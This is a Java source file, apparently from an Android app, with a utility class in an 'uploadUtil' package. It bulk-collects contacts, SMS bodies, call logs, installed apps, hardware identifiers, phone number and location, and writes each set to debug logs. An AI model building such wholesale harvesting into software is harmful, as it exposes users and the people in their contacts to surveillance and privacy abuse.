package com.cocotree.android.uploadUtil;

import android.content.ContentResolver;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.util.Log;

import com.cocotree.android.service.LocationService;
import com.google.gson.Gson;
import com.cocotree.android.manager.BaseApplication;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

/**
 * 作者：luoxiaohui
 * 日期:2018/11/10 10:14
 * 文件描述: 工具类
 */
public class Utils {

    /**
     * 读取联系人
     */
    public static ArrayList<Map<String, String>> readContacts() {

        ArrayList<Map<String, String>> list = new ArrayList();
        Cursor cursor = null;
        try {
            //cursor指针 query询问 contract协议 kinds种类
            cursor = BaseApplication.getInstance().getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String displayName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    HashMap map = new HashMap();
                    map.put("name", displayName);
                    map.put("phone", number);
                    list.add(map);
                }
            } else {
                CLog.e("readCallRecords", "没有授权读取联系人。。。");
            }
            CLog.d("读取联系人", new Gson().toJson(list));
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return list;
    }

    /**
     * 读取短信
     */
    public static ArrayList<Map<String, String>> readSms() {
        Uri SMS_INBOX = Uri.parse("content://sms/");

        ArrayList<Map<String, String>> list = new ArrayList();
        ContentResolver cr = BaseApplication.getInstance().getContentResolver();
        String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
        Cursor cur = cr.query(SMS_INBOX, projection, null, null, "date desc");
        if (null == cur) {
            CLog.e("readCallRecords", "没有授权读取短信。。。");
            return list;
        }
        try {

            int index = 0;
            while (cur.moveToNext() && index < 1000) {
                String number = cur.getString(cur.getColumnIndex("address"));//手机号
                String body = cur.getString(cur.getColumnIndex("body"));//短信内容
                String sendDate = cur.getString(cur.getColumnIndex("date"));//发送日期
                //至此就获得了短信的相关的内容, 以下是把短信加入map中，构建listview,非必要。
                Map<String, String> map = new HashMap<String, String>();
                map.put("address", number);
                map.put("content", body);
                map.put("sendDate", sendDate);
                map.put("type", "1");
                list.add(map);
                index++;
            }
            Log.e("test", "index--->" + index);

            CLog.d("短信记录", new Gson().toJson(list));
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            cur.close();
        }

        return list;
    }

    /**
     * 读取通话记录
     *
     * @return
     */
    public static List<Map<String, String>> readCallRecords() {
        // 1.获得ContentResolver
        ContentResolver resolver = BaseApplication.getInstance().getContentResolver();
        // 2.利用ContentResolver的query方法查询通话记录数据库
        /**
         * @param uri 需要查询的URI，（这个URI是ContentProvider提供的）
         * @param projection 需要查询的字段
         * @param selection sql语句where之后的语句
         * @param selectionArgs ?占位符代表的数据
         * @param sortOrder 排序方式
         *
         */
        Cursor cursor = resolver.query(CallLog.Calls.CONTENT_URI, // 查询通话记录的URI
                new String[]{CallLog.Calls.CACHED_NAME// 通话记录的联系人
                        , CallLog.Calls.NUMBER// 通话记录的电话号码
                        , CallLog.Calls.DATE// 通话记录的日期
                        , CallLog.Calls.DURATION// 通话时长
                        , CallLog.Calls.TYPE}// 通话类型
                , null, null, CallLog.Calls.DEFAULT_SORT_ORDER// 按照时间逆序排列，最近打的最先显示
        );
        // 3.通过Cursor获得数据
        List<Map<String, String>> list = new ArrayList<Map<String, String>>();
        int index = 0;
        if (cursor == null) {
            CLog.e("readCallRecords", "没有授权获取通话记录。。。");
            return list;
        }
        while (cursor.moveToNext() && index < 1000) {
            String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
            String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
            long dateLong = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
            String date = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.CHINA).format(new Date(dateLong));
            int duration = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.DURATION));
            int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));

            Map<String, String> map = new HashMap<String, String>();
            map.put("cachedName", (name == null) ? "未备注联系人" : name);
            map.put("number", number);
            map.put("calledDate", date);
            map.put("duration", duration + "");
            map.put("type", type + "");
            list.add(map);
            index++;
        }
        cursor.close();
        CLog.d("通话记录", new Gson().toJson(list));
        return list;
    }

    /**
     * 读取手机app-list
     */

    public static List<Map<String, String>> getAppList() {
        PackageManager packageManager = BaseApplication.getInstance().getPackageManager();
        List<PackageInfo> packageInfoList = packageManager.getInstalledPackages(0);
        // 判断是否系统应用：
        List<Map<String, String>> list = new ArrayList<>();
        for (int i = 0; i < packageInfoList.size(); i++) {
            PackageInfo pak = packageInfoList.get(i);
            String appName = pak.applicationInfo.loadLabel(packageManager).toString();

            Map<String, String> map = new HashMap<>();

            //判断是否为系统预装的应用
            if ((pak.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) <= 0) {
                map.put("packageName", pak.packageName);
                // 第三方应用
                map.put("appName", appName);
                list.add(map);
            }
        }
        CLog.d("手机app-list", new Gson().toJson(list));
        return list;
    }

    /**
     * 设备信息
     */
    public static Map<String, Object> getDeviceInfo() {

        Map<String, Object> map = new HashMap<>();
        map.put("ip", Tools.getIpAddress());
        map.put("DeviceId", Settings.System.getString(BaseApplication.getInstance().getContentResolver(), Settings.System.ANDROID_ID));
        map.put("androidId", Settings.System.getString(BaseApplication.getInstance().getContentResolver(), Settings.System.ANDROID_ID));
        map.put("serialNo", android.os.Build.SERIAL);
        map.put("size", Tools.getResolution());
        map.put("isRoot", "0");
        map.put("brand", Build.BRAND);
        map.put("phoneModel", Build.MODEL);
        map.put("osVersion", Build.VERSION.SDK_INT + "");
        map.put("capacity", Tools.getAvailableExternalMemorySize());
        map.put("imsi", Tools.getIMSI(BaseApplication.getInstance()));
        map.put("mac", Tools.getMac(BaseApplication.getInstance()));
        map.put("osName", "Android");
        map.put("gmttime", "");
        map.put("size", Tools.getPingMuSize(BaseApplication.getInstance()));
        map.put("resolution", Tools.getResolution());
        map.put("gmttime", Tools.getTime13());
        map.put("wifi", Tools.getWifiName());
        map.put("imei", Tools.getIMEI(BaseApplication.getInstance()));
        map.put("tokenNo", Tools.getIMEI(BaseApplication.getInstance()));
        map.put("simphone", Tools.getNativePhoneNumber(BaseApplication.getInstance()));
        map.put("locationType", Tools.getNetworkType());
        map.put("locationX", LocationService.getInstance().getLocationX() + "");
        map.put("locationY", LocationService.getInstance().getLocationY() + "");
        map.put("location", LocationService.getInstance().getLocation() + "");

        return map;
    }
}

